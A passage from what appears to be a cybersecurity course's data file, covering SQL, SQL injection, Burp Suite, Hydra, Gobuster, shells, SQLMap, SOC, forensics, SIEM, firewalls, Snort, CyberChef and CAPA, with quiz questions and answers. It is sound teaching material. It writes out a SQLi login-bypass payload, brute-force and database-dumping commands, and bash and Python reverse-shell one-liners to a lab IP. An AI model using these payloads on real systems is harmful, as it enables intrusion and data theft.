            <p>Databases store information in <b>Tables</b> consisting of vertical <b>Columns (attributes)</b> and horizontal <b>Rows (records)</b>. Each table typically uses a <b>Primary Key</b> to uniquely identify every row.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is an individual row in a database table called?</i> <b>Record</b></li>
            </ul>`},

          {title:"Essential SQL Queries", notes:`
            <p>Standard SQL commands for data retrieval and manipulation:</p>
            <pre><code>-- Select specific columns from users table
SELECT username, email FROM users WHERE role = 'admin';

-- Order results and limit output
SELECT * FROM products ORDER BY price DESC LIMIT 5;

-- Insert a new record
INSERT INTO users (username, password) VALUES ('adam', 'password123');

-- Update an existing record
UPDATE users SET email = 'adam@example.thm' WHERE id = 1;

-- Join data across two related tables
SELECT orders.id, users.username, orders.total
FROM orders
JOIN users ON orders.user_id = users.id;</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which SQL keyword filters rows matching specific conditions?</i> <b>WHERE</b></li>
            </ul>`},

          {title:"SQL Injection (SQLi) Mechanics", notes:`
            <p><b>SQL Injection</b> occurs when user input is concatenated directly into a database query string instead of being treated as isolated parameter data:</p>
            <pre><code>-- Vulnerable backend query construction:
query = "SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "'";

-- If userInput is: admin' OR '1'='1' --
-- The resulting SQL executed by the engine becomes:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...';</code></pre>
            <p>Because <code>'1'='1'</code> is universally true and <code>--</code> comments out the password check, authentication is completely bypassed!</p>
            <div class="callout">
              <b>Primary Defense:</b> Use <b>Prepared Statements (Parameterized Queries)</b> so input is never interpreted as executable code by the database parser.
            </div>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What software development practice securely prevents SQL injection by separating code from data?</i> <b>Prepared Statements</b></li>
            </ul>`}
         ]},

        {name:"Burp Suite: The Basics", text:"An introduction to using Burp Suite for web application pentesting.",
         icon:"⚡", level:"easy", time:"35 min",
         tasks:[
          {title:"Intercepting HTTP/S Traffic", notes:`
            <p><b>Burp Suite</b> is the premier web security testing platform. It operates as an intercepting local HTTP proxy (defaulting to <code>127.0.0.1:8080</code>) situated between your browser and the web server.</p>
            <p>When Intercept is turned <b>ON</b>, Burp pauses every HTTP request, allowing security testers to view and alter parameters, cookies, and headers before releasing the request to the target server.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What default port does Burp Suite's proxy listener bind to?</i> <b>8080</b></li>
            </ul>`},

          {title:"Using Burp Repeater", notes:`
            <p><b>Burp Repeater</b> is designed for manual, iterative request tampering. Right-clicking an intercepted request and selecting <b>Send to Repeater</b> (or pressing <code>Ctrl+R</code>) allows you to re-send requests hundreds of times with slight payload variations and immediately inspect response headers and HTML diffs.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which keyboard shortcut sends an intercepted request to Burp Repeater?</i> <b>Ctrl+R</b></li>
            </ul>`},

          {title:"Automated Fuzzing with Burp Intruder", notes:`
            <p><b>Burp Intruder</b> automates custom attacks against web applications by spraying wordlists across defined payload positions:</p>
            <ul>
              <li><b>Sniper:</b> Tests single positions sequentially with a wordlist (ideal for fuzzing individual parameters).</li>
              <li><b>Battering Ram:</b> Replaces multiple positions simultaneously with the same wordlist item.</li>
              <li><b>Pitchfork:</b> Uses multiple wordlists in parallel across multiple positions.</li>
              <li><b>Cluster Bomb:</b> Tests every combination of multiple wordlists (ideal for username + password brute force).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Intruder attack mode tests every Cartesian combination of multiple wordlists?</i> <b>Cluster Bomb</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"🏹", title:"Offensive Security Tooling", text:"Explore three offensive tools; Hydra, Gobuster, and SQLMap are used for penetration testing passwords, directories, and databases respectively.",
       intro:"This module adds three offensive security tools to your arsenal. It teaches you how to use Hydra for attacking passwords, Gobuster for discovering pages and web directories, and SQLMap for exploiting vulnerable database systems.",
       rooms:[
        {name:"Hydra", text:"Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials.",
         icon:"🐍", level:"easy", time:"30 min",
         tasks:[
          {title:"Online Password Cracking Principles", notes:`
            <p>Unlike offline cracking (like John the Ripper which tests millions of hashes per second locally on GPU), <b>online password cracking</b> involves sending network authentication requests across active network sockets.</p>
            <p>Online attacks are throttled by network latency, target connection limits, and defensive rate-limiting or account lockout thresholds (e.g. locking after 5 failed attempts).</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What defensive security mechanism automatically disables accounts after repeated failed logins?</i> <b>Account lockout</b></li>
            </ul>`},

          {title:"Cracking Network Services (SSH & FTP)", notes:`
            <p><b>Hydra</b> is a fast multi-threaded network logon cracker supporting over 50 protocols including SSH, FTP, Telnet, RDP, and HTTP:</p>
            <pre><code># Brute force SSH with a known username and wordlist
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.50 -t 4

# Brute force FTP using lists for both users and passwords
hydra -L users.txt -P passwords.txt ftp://10.10.10.50</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which flag in Hydra specifies a path to a password wordlist file?</i> <b>-P</b></li>
            </ul>`},

          {title:"Web Login Form Brute-Forcing", notes:`
            <p>Hydra can automate credential stuffing attacks against web forms using the <code>http-post-form</code> module:</p>
            <pre><code># Syntax: path:request_body:failure_condition
hydra 10.10.10.50 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Invalid username or password" \
  -l admin -P passwords.txt -v</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Hydra module is used to attack HTTP POST login web forms?</i> <b>http-post-form</b></li>
            </ul>`}
         ]},

        {name:"Gobuster: The Basics", text:"This room focuses on an introduction to Gobuster, an offensive security tool used for enumeration.",
         icon:"💻", level:"easy", time:"30 min",
         tasks:[
          {title:"Directory & File Enumeration", notes:`
            <p><b>Gobuster</b> is a high-performance scanner written in Go designed to brute-force web URIs (directories and files), DNS subdomains, and virtual host names.</p>
            <pre><code># Brute force directories and specific file extensions
gobuster dir -u http://10.10.10.50/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak -t 30</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which flag on Gobuster specifies target file extensions to append to wordlist items?</i> <b>-x</b></li>
            </ul>`},

          {title:"DNS Subdomain & VHost Enumeration", notes:`
            <p>Organizations often host internal administrative consoles on subdomains (<code>dev.example.thm</code>) or virtual hosts sharing the same IP address:</p>
            <pre><code># Brute force DNS subdomains
gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Enumerate virtual hosts by testing the Host HTTP header
gobuster vhost -u http://example.thm -w vhosts.txt --append-domain</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Gobuster mode is used to discover subdomains by querying DNS records?</i> <b>dns</b></li>
            </ul>`}
         ]},

        {name:"Shells Overview", text:"Learn about the different types of shells.",
         icon:"🐚", level:"easy", time:"30 min",
         tasks:[
          {title:"Reverse Shells vs Bind Shells", notes:`
            <p>When exploiting a target, obtaining command execution typically culminates in spawning an interactive shell session:</p>
            <table>
              <thead>
                <tr><th>Shell Type</th><th>How it Works</th><th>Firewall Penetration</th></tr>
              </thead>
              <tbody>
                <tr>
                  <td><b>Reverse Shell</b></td>
                  <td>The target executes a payload that connects <i>outbound</i> to a listener waiting on the attacker's machine.</td>
                  <td><span class="yes">Excellent:</span> Most perimeter firewalls permit outbound traffic (e.g. over port 443/80).</td>
                </tr>
                <tr>
                  <td><b>Bind Shell</b></td>
                  <td>The payload binds a listening port directly on the victim machine and waits for the attacker to connect.</td>
                  <td><span class="no">Poor:</span> Inbound firewall rules typically block unsolicited connections to strange ports.</td>
                </tr>
              </tbody>
            </table>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which shell type connects outbound from the victim to an attacker listener to bypass inbound firewall rules?</i> <b>Reverse Shell</b></li>
            </ul>`},

          {title:"Catching Shells with Netcat", notes:`
            <p><b>Netcat (<code>nc</code>)</b> is known as the networking Swiss Army knife:</p>
            <pre><code># Set up a reverse shell listener
nc -lvnp 4444
# -l: Listen mode
# -v: Verbose output
# -n: Do not resolve DNS (speeds up connection)
# -p: Port number</code></pre>
            <p>Common reverse shell payloads:</p>
            <pre><code># Bash reverse shell:
bash -i >& /dev/tcp/10.10.14.22/4444 0>&1

# Python reverse shell:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Netcat flag specifies listening mode?</i> <b>-l</b></li>
            </ul>`},

          {title:"TTY Shell Stabilization", notes:`
            <p>Raw netcat shells lack basic terminal capabilities (no tab completion, arrow history, or <code>Ctrl+C</code> handling). Attackers stabilize raw shells into full TTY terminals using Python and stty:</p>
            <pre><code># 1. Inside netcat shell, spawn pty:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background the shell:
Ctrl + Z

# 3. In your local terminal, raw echoing:
stty raw -echo; fg

# 4. Set terminal environment variables:
reset
export TERM=xterm
export SHELL=bash</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Python module is used to spawn an interactive pseudo-terminal inside raw netcat shells?</i> <b>pty</b></li>
            </ul>`}
         ]},

        {name:"SQLMap: The Basics", text:"Learn about SQL injection and exploit this vulnerability through the SQLMap tool.",
         icon:"🛢️", level:"easy", time:"35 min",
         tasks:[
          {title:"Automated SQLi Scanning", notes:`
            <p><b>SQLMap</b> is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities across dozens of database management systems.</p>
            <pre><code># Scan a vulnerable GET parameter
sqlmap -u "http://10.10.10.50/view.php?id=1" --batch

# Test a POST request captured from Burp Suite
sqlmap -r request.txt -p username --batch</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which flag on SQLMap runs non-interactively using default answers for all questions?</i> <b>--batch</b></li>
            </ul>`},

          {title:"Database Enumeration & Data Dumping", notes:`
            <p>Once SQLMap confirms injection, it can enumerate the database schema and exfiltrate data:</p>
            <pre><code># Enumerate available databases
sqlmap -u "http://10.10.10.50/view.php?id=1" --dbs

# Enumerate tables in the 'webapp' database
sqlmap -u "http://10.10.10.50/view.php?id=1" -D webapp --tables

# Dump columns and data from the 'users' table
sqlmap -u "http://10.10.10.50/view.php?id=1" -D webapp -T users --dump</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which SQLMap flag is used to dump data records from a target table?</i> <b>--dump</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"🛡️", title:"Defensive Security", text:"This module will help you build your defensive security knowledge. It covers key topics such as SOC, digital forensics, and incident response.",
       intro:"This module will teach you various critical cyber security skills for effectively monitoring, detecting, and responding to security incidents. It will also explain the role of the Security Operations Center (SOC) team and the tools they use. Furthermore, it will help you acquire essential digital forensics and incident response techniques. This knowledge will help you build a solid foundation in defensive security.",
       rooms:[
        {name:"SOC Fundamentals", text:"Learn about the SOC team and their processes.",
         icon:"🔵", level:"easy", time:"30 min",
         tasks:[
          {title:"SOC Tiers & Operations", notes:`
            <p>A corporate Security Operations Center is organized into tiered escalation workflows:</p>
            <ul>
              <li><b>Tier 1 (Triage / Alert Analyst):</b> Continuously monitors the SIEM queue, filters false positives, and escalates true anomalies.</li>
              <li><b>Tier 2 (Incident Responder):</b> Performs deep-dive forensic analysis, scope assessment, containment, and system recovery.</li>
              <li><b>Tier 3 (Threat Hunter / Senior Analyst):</b> Proactively hunts for stealthy adversaries that bypassed automated detection rules, develops custom detection rules, and performs malware reverse engineering.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which SOC tier handles initial alert triaging and filtering false positives?</i> <b>Tier 1</b></li>
            </ul>`},

          {title:"Detection Engineering & SIEM Rules", notes:`
            <p>Detection engineers write SIEM correlation rules based on threat models like <b>MITRE ATT&amp;CK</b>:</p>
            <div class="callout">
              <b>Example Alert Rule:</b> Alert when <code>certutil.exe</code>, <code>powershell.exe</code>, or <code>curl.exe</code> is spawned by <code>winword.exe</code> or <code>excel.exe</code> (classic Office phishing macro behavior!).
            </div>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which global knowledge base cataloging adversary tactics and techniques informs modern SIEM rule engineering?</i> <b>MITRE ATT&CK</b></li>
            </ul>`}
         ]},

        {name:"Digital Forensics Fundamentals", text:"Learn about digital forensics and related processes and experiment with a practical example.",
         icon:"🔍", level:"easy", time:"35 min",
         tasks:[
          {title:"Evidence Preservation & Chain of Custody", notes:`
            <p><b>Digital Forensics</b> requires rigorous legal integrity. If evidence is altered during collection, it becomes inadmissible in court.</p>
            <p>Investigators follow the <b>Chain of Custody</b> — a chronological paper trail documenting who seized, transferred, analyzed, and stored each piece of physical and digital evidence.</p>
            <p>Before examining hard drives, investigators use hardware <b>write-blockers</b> and calculate cryptographic hashes (SHA-256) of forensic disk bit-stream images (<code>.E01</code>, <code>.dd</code>) to prove bit-for-bit authenticity.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What hardware device prevents accidental modification of a drive during forensic acquisition?</i> <b>write-blocker</b></li>
            </ul>`},

          {title:"Windows Forensic Artifacts", notes:`
            <p>Windows operating systems record extensive evidence of program execution:</p>
            <ul>
              <li><b>Prefetch (<code>C:\\Windows\\Prefetch</code>):</b> Records application execution timestamps, launch count, and loaded DLL dependencies (<code>.pf</code> files).</li>
              <li><b>Shimcache / Amcache:</b> Application Compatibility database storing historical evidence of binaries present on system.</li>
              <li><b>UserAssist:</b> Registry keys logging executed GUI programs encoded in ROT13.</li>
              <li><b>Shellbags:</b> Registry artifacts proving a user navigated into specific local or network folders even after they have been deleted.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Windows folder contains .pf files that record evidence of executed programs and launch counts?</i> <b>Prefetch</b></li>
            </ul>`}
         ]},

        {name:"Incident Response Fundamentals", text:"Learn how to perform Incident Response in cyber security.",
         icon:"🚨", level:"easy", time:"30 min",
         tasks:[
          {title:"The Incident Response Lifecycle", notes:`
            <p>Both NIST (SP 800-61) and SANS codify standardized incident response phases:</p>
            <ol>
              <li><b>Preparation:</b> Establishing playbooks, tooling, access controls, and incident communication channels before attacks occur.</li>
              <li><b>Detection &amp; Analysis:</b> Confirming compromise, triaging alerts, and assessing incident scope.</li>
              <li><b>Containment:</b> Short-term (disconnecting host from network) and long-term containment.</li>
              <li><b>Eradication:</b> Deleting malware, revoking compromised credentials, and patching exploited flaws.</li>
              <li><b>Recovery:</b> Restoring systems from verified backups and validating normal operations.</li>
              <li><b>Lessons Learned:</b> Post-incident retrospective to improve detection defenses.</li>
            </ol>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which IR phase involves isolating infected systems from the network to stop lateral spread?</i> <b>Containment</b></li>
            </ul>`}
         ]},

        {name:"Logs Fundamentals", text:"Learn what logs are and how to analyze them for effective investigation.",
         icon:"📜", level:"easy", time:"30 min",
         tasks:[
          {title:"Log Formats & Audit Trails", notes:`
            <p>Logs are chronological records of system events. Standard audit sources include:</p>
            <ul>
              <li><b>Web Server Logs (Apache / Nginx):</b> Common Log Format (CLF) recording client IP, timestamp, HTTP method, URI, status code, and User-Agent.</li>
              <li><b>Windows Event Logs (<code>.evtx</code>):</b> Structured XML logs categorized into System, Application, and Security (e.g. Event ID <code>4624</code>: Successful Logon; Event ID <code>4625</code>: Failed Logon).</li>
              <li><b>Syslog (RFC 5424):</b> Standardized Unix logging assigning severity levels from 0 (Emergency) to 7 (Debug).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What Windows Event ID signifies a failed user logon attempt?</i> <b>4625</b></li>
            </ul>`},

          {title:"Log Parsing with Command-Line Tools", notes:`
            <p>Security responders parse multi-gigabyte text logs rapidly using Linux CLI tools:</p>
            <pre><code># Extract unique IP addresses attempting admin logins:
cat access.log | grep "/admin" | awk '{print $1}' | sort | uniq -c | sort -nr

# Count top 10 requesting User-Agent strings:
awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -nr | head -n 10</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which command-line utility filters duplicate adjacent lines and counts occurrences with -c?</i> <b>uniq</b></li>
            </ul>`}
         ]}
       ]}
,
      {icon:"🛡️", title:"Security Solutions", text:"Explore fundamental defensive security solutions like firewalls, IDS, vulnerability scanners, and SIEM through different hands-on exercises.",
       intro:"In this module, you will learn how essential defensive security solutions work, such as firewalls, Intrusion Detection Systems (IDS), vulnerability scanners, and Security Information and Event Management (SIEM). Through hands-on exercises, you will learn how to use firewalls to allow or block traffic, IDS to detect intrusions, vulnerability scanners to find vulnerabilities, and the SIEM solution to monitor centralized security events. This module will equip you with the arsenal to protect digital infrastructure.",
       rooms:[
        {name:"Introduction to SIEM", text:"Learn the fundamentals of SIEM and explore its features and functionality.",
         icon:"🖥️", level:"easy", time:"35 min",
         tasks:[
          {title:"What is a SIEM?", notes:`
            <p>A <b>Security Information and Event Management (SIEM)</b> platform serves as the central nervous system of modern Security Operations Centers (SOC). Enterprise networks contain thousands of endpoints, firewalls, domain controllers, and cloud services, each generating millions of event logs per day.</p>
            <p>A SIEM solves log overload through four foundational capabilities:</p>
            <ul>
              <li><b>Log Aggregation &amp; Centralization:</b> Shippers and agents forward syslog, Windows Event Logs (EVTX), and application logs to a centralized data lake.</li>
              <li><b>Normalization &amp; Parsing:</b> Standardizes disparate log formats into unified field schemas (e.g. Elastic Common Schema - ECS) so queries can match source IPs across Apache, Cisco, and Windows simultaneously.</li>
              <li><b>Rule-Based Correlation:</b> Analyzes incoming event streams in real-time against correlation logic to detect multi-stage attack patterns.</li>
              <li><b>Alerting &amp; Dashboards:</b> Generates high-priority alerts with context to allow SOC analysts to triage and investigate quickly.</li>
            </ul>
            ${siemPipelineSVG()}
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What does SIEM stand for?</i> <b>Security Information and Event Management</b></li>
            </ul>`},

          {title:"Correlation Rules & Detection", notes:`
            <p>A single failed password attempt is normal human error. However, a <b>Correlation Rule</b> looks for anomalous frequency and sequences across multiple systems.</p>
            <p>Example correlation scenario: <i>Brute-Force &amp; Lateral Movement</i>:</p>
            <pre><code>Rule: SSH Brute Force Followed by Success
Condition:
  - Event: Failed SSH Login (Port 22)
  - Threshold: >= 10 occurrences from single Source IP within 60 seconds
  - Followed By: Successful SSH Login from identical Source IP within 180 seconds
Action: Trigger Severity 1 Alert -> Notify On-Call Analyst -> Auto-isolate Host</code></pre>
            <p>Industry-standard SIEM platforms include <b>Splunk Enterprise Security</b>, <b>Elastic Security</b>, <b>Microsoft Sentinel</b>, and <b>IBM QRadar</b>.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What engine links seemingly unrelated log entries across time to detect complex threats?</i> <b>Correlation engine</b></li>
            </ul>`}
         ]},

        {name:"Firewall Fundamentals", text:"Learn about firewalls and get hands-on with Windows and Linux built-in firewalls.",
         icon:"🔥", level:"easy", time:"30 min",
         tasks:[
          {title:"Firewall Mechanics & Architectures", notes:`
            <p>A <b>Firewall</b> is a network security barrier that monitors and filters incoming and outgoing traffic based on predetermined security rules. Firewalls enforce an organization's <b>Access Control Policy</b>, typically following the security best practice of <i>Default Deny</i> (drop all traffic unless explicitly permitted).</p>
            <p>Firewalls are categorized by their inspection depth:</p>
            <ul>
              <li><b>Stateless Packet Filtering (Layer 3 &amp; 4):</b> Inspects individual packet headers (Source IP, Destination IP, Protocol, Port). It makes isolated permit/deny decisions without tracking previous packets.</li>
              <li><b>Stateful Inspection:</b> Maintains a state connection table in memory. It verifies whether an incoming packet belongs to an existing established session (e.g. allowing reply traffic from a web server only if the internal host initiated the request).</li>
              <li><b>Next-Generation Firewalls (NGFW / Layer 7):</b> Performs Deep Packet Inspection (DPI) to identify application signatures, block specific web actions, and inspect TLS-encrypted traffic.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which firewall type tracks active connections to allow return traffic automatically?</i> <b>Stateful firewall</b></li>
            </ul>`},

          {title:"Host Firewalls: iptables, UFW, & Windows Defender", notes:`
            <p>While hardware firewalls guard network perimeters, <b>Host-Based Firewalls</b> protect individual operating systems even if perimeter defenses are breached.</p>
            <p><b>Linux UFW (Uncomplicated Firewall):</b></p>
            <pre><code># Check active status and rules
sudo ufw status verbose

# Set default security policies
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Allow specific services
sudo ufw allow 22/tcp comment 'SSH Remote Admin'
sudo ufw allow 80,443/tcp comment 'Web Traffic'

# Enable firewall
sudo ufw enable</code></pre>
            <p>In Windows, <b>Windows Defender Firewall with Advanced Security</b> operates via graphical MMC snap-in or CLI commands (<code>netsh advfirewall</code> / PowerShell <code>New-NetFirewallRule</code>) controlling inbound and outbound profile rules for Domain, Private, and Public networks.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the default recommended security policy for incoming perimeter firewall traffic?</i> <b>Default deny</b></li>
            </ul>`}
         ]},

        {name:"IDS Fundamentals", text:"Learn the fundamentals of IDS, along with the experience of working with Snort.",
         icon:"🐗", level:"easy", time:"35 min",
         tasks:[
          {title:"IDS vs IPS Fundamentals", notes:`
            <p>An <b>Intrusion Detection System (IDS)</b> monitors network traffic or system activities for malicious events and policy violations. It is primarily <b>passive</b>: it analyzes a mirrored copy of network traffic (via a SPAN port or network TAP) and raises alerts without disrupting traffic flow.</p>
            <p>An <b>Intrusion Prevention System (IPS)</b> sits directly <b>in-line</b> across the physical data path. When malicious traffic is recognized, it actively drops packets or terminates TCP connections before the attack reaches the destination victim.</p>
            <p>Detection methodologies:</p>
            <ul>
              <li><b>Signature-Based Detection:</b> Matches traffic against a database of known exploit patterns, byte sequences, or CVE signatures (fast, high accuracy, but misses zero-day exploits).</li>
              <li><b>Anomaly / Heuristic-Based Detection:</b> Establishes a baseline of normal network activity and alerts on deviations (effective against new attacks, but generates higher false-positive rates).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which system sits in-line to actively block malicious network packets?</i> <b>IPS</b></li>
            </ul>`},

          {title:"Snort Rule Construction & Syntax", notes:`
            <p><b>Snort</b> is the most widely deployed open-source NIDS in the world. A Snort rule consists of two parts: the <b>Rule Header</b> (action, protocol, IPs, ports, direction) and <b>Rule Options</b> (payload inspection keywords enclosed in parentheses).</p>
            ${snortRuleSVG()}
            <p>Example Snort Rule Syntax:</p>
            <pre><code>alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:"ET EXPLOIT FTP USER root Attempt"; flow:to_server,established; content:"USER root"; nocase; sid:2001001; rev:1;)</code></pre>
            <p><b>Rule Fields:</b></p>
            <ul>
              <li><code>alert</code>: Action to take when matched (others: <code>log</code>, <code>drop</code>, <code>reject</code>).</li>
              <li><code>nocase</code>: Ignores case sensitivity during pattern matching.</li>
              <li><code>sid</code>: Snort ID (numbers &gt; 1,000,000 denote custom local user rules).</li>
              <li><code>rev</code>: Rule revision number.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which rule option parameter denotes the unique identification number of a Snort rule?</i> <b>sid</b></li>
            </ul>`}
         ]},

        {name:"Vulnerability Scanner Overview", text:"Learn about vulnerability scanners and how they work in a practical scenario.",
         icon:"🔍", level:"easy", time:"25 min",
         tasks:[
          {title:"Vulnerability Scanning Lifecycle", notes:`
            <p>A <b>Vulnerability Scanner</b> is an automated software tool that inventories assets across a network, probes them for unpatched software, security misconfigurations, and known Common Vulnerabilities and Exposures (CVEs), and assigns severity scores using the Common Vulnerability Scoring System (CVSS).</p>
            <p>The standard scanning lifecycle follows four phases:</p>
            <ol>
              <li><b>Host Discovery:</b> Sending ICMP echo requests and TCP SYN packets to identify live active IPs.</li>
              <li><b>Port &amp; Service Enumeration:</b> Identifying open ports (e.g. 22, 80, 445) and querying banners to determine running server versions.</li>
              <li><b>Vulnerability Probing:</b> Querying against a vulnerability database (plugins) and sending crafted harmless probes to verify software vulnerabilities.</li>
              <li><b>Scoring &amp; Remediation Reporting:</b> Generating actionable reports prioritizing fixes based on CVSS ratings (Low, Medium, High, Critical).</li>
            </ol>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What standardized framework provides numerical severity scores from 0.0 to 10.0 for vulnerabilities?</i> <b>CVSS</b></li>
            </ul>`},

          {title:"Credentialed vs Non-Credentialed Scans", notes:`
            <p>Vulnerability scans can be conducted with or without administrative login credentials:</p>
            <ul>
              <li><b>Non-Credentialed (Unauthenticated) Scan:</b> The scanner looks at the target from an external hacker's perspective over the network. It discovers exposed ports and vulnerable service banners, but cannot see internal configuration files or local patch history.</li>
              <li><b>Credentialed (Authenticated) Scan:</b> The scanner logs into the target system using SSH or Windows SMB credentials. It reads registry keys, inspects installed packages, verifies file permissions, and audits local system configurations with near zero network overhead.</li>
            </ul>
            <p>Prominent tools: <b>Tenable Nessus</b>, <b>OpenVAS / Greenbone Vulnerability Management (GVM)</b>, <b>Qualys VMDR</b>, and <b>Rapid7 Nexpose</b>.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which scan type uses system login credentials to inspect installed software patches directly?</i> <b>Credentialed scan</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"⚔️", title:"Defensive Security Tooling", text:"Dive into various defensive security tools and distributions such as CyberChef, CAPA, REMnux, and FlareVM.",
       intro:"This module will teach you various critical cyber security skills for effectively monitoring, detecting, and responding to security incidents. It will also explain the role of the Security Operations Center (SOC) team and the tools they use. Furthermore, it will help you acquire essential digital forensics and incident response techniques. This knowledge will help you build a solid foundation in defensive security.",
       rooms:[
        {name:"CyberChef: The Basics", text:"This room is an introduction to CyberChef, the Swiss Army knife for cyber security professionals.",
         icon:"🛡️", level:"easy", time:"30 min",
         tasks:[
          {title:"The Cyber Swiss Army Knife", notes:`
            <p><b>CyberChef</b> is an open-source web application created by the UK Government Communications Headquarters (GCHQ). It enables analysts to encode, decode, parse, decrypt, and decompress data rapidly inside a web browser without writing scripts.</p>
            <p>The CyberChef interface is divided into four primary panels:</p>
            <ul>
              <li><b>Operations:</b> The left panel listing hundreds of analytical functions organized into categories (Arithmetic, Flow Control, Hashing, Compression, Encryption).</li>
              <li><b>Recipe:</b> The central staging area where operations are stacked sequentially. Output from step 1 feeds directly into step 2.</li>
              <li><b>Input:</b> The data pane where obfuscated text, base64 strings, or raw hex dumps are pasted.</li>
              <li><b>Output:</b> Displays the real-time processed result of the staged recipe.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which intelligence agency originally developed CyberChef?</i> <b>GCHQ</b></li>
            </ul>`},

          {title:"Common Recipes in Malware Analysis", notes:`
            <p>Threat actors frequently obfuscate malicious command lines to bypass antivirus signatures. Security analysts construct modular recipes in CyberChef to peel back these layers:</p>
            <pre><code>Example Deobfuscation Recipe:
1. From Base64 (A-Za-z0-9+/=)
2. Gunzip (Decompress gzip payload)
3. Decode text (UTF-16LE / Unicode)
4. Defang URL (Converts http:// to hxxp:// to prevent accidental clicks)</code></pre>
            <p>Useful built-in operations also include <i>Extract IP addresses</i>, <i>XOR Brute Force</i>, <i>Parse X.509 Certificate</i>, and <i>Magic</i> (automatically detecting unknown encodings and compression formats).</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which CyberChef operation automatically tests combinations of decoders to identify unknown obfuscated data?</i> <b>Magic</b></li>
            </ul>`}
         ]},

        {name:"CAPA: The Basics", text:"Learn to use CAPA to identify malicious capabilities.",
         icon:"🪟", level:"easy", time:"30 min",
         tasks:[
          {title:"Capability Detection with CAPA", notes:`
            <p><b>CAPA</b> is an open-source command-line tool developed by Mandiant (Google Cloud) that automatically detects what an executable binary or shellcode can do. Instead of just telling you if a file is malicious, CAPA tells you its <b>capabilities</b> (e.g. <i>"encrypts files"</i>, <i>"injects shellcode into remote process"</i>, <i>"persists via Windows Run keys"</i>).</p>
            <p>How CAPA works:</p>
            <ul>
              <li>It analyzes PE files, ELF binaries, and raw shellcode statically without executing them.</li>
              <li>It matches binary disassembly against thousands of human-readable YAML rules describing API call patterns, constants, and byte sequences.</li>
              <li>It maps detected capabilities directly to the <b>MITRE ATT&amp;CK</b> framework and the <b>Malware Behavior Catalog (MBC)</b>.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which cybersecurity organization created and maintains CAPA?</i> <b>Mandiant</b></li>
            </ul>`},

          {title:"Running CAPA & Interpreting Outputs", notes:`
            <p>Executing CAPA in a terminal against an unknown suspicious sample:</p>
            <pre><code>capa suspicious_sample.exe

# Output summary format:
+------------------------+-------------------------------------------------+
| ATT&CK Tactic          | ATT&CK Technique                                |
|------------------------+-------------------------------------------------|
| DEFENSE EVASION        | Obfuscated Files or Information [T1027]         |
| DISCOVERY              | System Network Configuration Discovery [T1016]  |
| EXECUTION              | Command and Scripting Interpreter [T1059]       |
+------------------------+-------------------------------------------------+

CAPABILITY                                    | NAMESPACE
----------------------------------------------+---------------------------
contain an embedded PE file                   | load-code/pe
create reverse shell                          | communication/c2
enumerate network adapters                    | host-interaction/network</code></pre>
            <p>This allows triage analysts in a SOC to prioritize critical malware incidents in minutes rather than hours of full reverse-engineering.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which industry framework does CAPA map detected malware tactics and techniques to?</i> <b>MITRE ATT&amp;CK</b></li>
            </ul>`}
         ]},

        {name:"REMnux: Getting Started", text:"Learn how you can use the tools inside the REMnux VM.",
         icon:"🐧", level:"easy", time:"35 min",
         tasks:[
